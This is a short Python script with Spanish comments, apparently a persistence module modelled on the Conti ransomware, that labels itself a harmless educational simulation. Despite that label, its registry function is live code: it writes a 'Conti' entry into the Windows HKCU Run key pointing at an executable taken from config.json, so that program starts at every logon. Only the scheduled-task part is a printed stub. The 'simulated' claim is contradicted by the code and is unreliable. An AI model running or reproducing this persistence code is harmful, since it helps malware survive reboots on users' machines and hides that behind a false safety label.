# ADVERTENCIA: Este es un archivo simulado educativo. No ejecutar en sistemas reales.
# Simula modificaciones para persistencia en el sistema.

import winreg  # Simulado
import json

def load_config():
    with open('config.json', 'r') as f:
        return json.load(f)

def add_to_registry(run_key, exe_path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Conti", 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)
    print("Añadido al registro para persistencia.")

def create_scheduled_task(task_name, exe_path):
    # Simular schtasks
    print(f"Creando tarea programada: {task_name}")

if __name__ == "__main__":
    config = load_config()
    add_to_registry(config['registry_key'], config['exe_path'])
    create_scheduled_task(config['task_name'], config['exe_path'])